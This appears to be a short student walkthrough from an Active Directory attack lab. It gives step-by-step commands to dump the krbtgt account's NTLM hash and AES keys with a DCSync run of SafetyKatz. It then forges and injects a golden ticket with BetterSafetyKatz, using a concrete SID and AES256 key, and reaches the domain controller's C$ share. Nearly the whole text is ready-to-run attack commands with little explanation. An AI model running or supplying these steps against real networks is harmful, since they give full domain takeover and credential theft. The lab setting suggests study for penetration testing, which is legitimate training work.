  To get NTLM hash and AES keys of the krbtgt account, we can use the DCSync attack. Run the below 
command from process running as Domain Admin: dcorp-svcadmin 
-> C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
Note: Run this command using svcadmin shell to request credentials for krbtgt account

Now copt aes256 key from kerbtg account which we got from previous output
Run this command from cmd as admin:
->  C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
/startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

Sid Is from domain which we got in our enum phase 

Now access domain controller account
-> dir \\dcorp-dc\c$
-> gwmi -Class win32_computersystem -ComputerName dcorp-dc
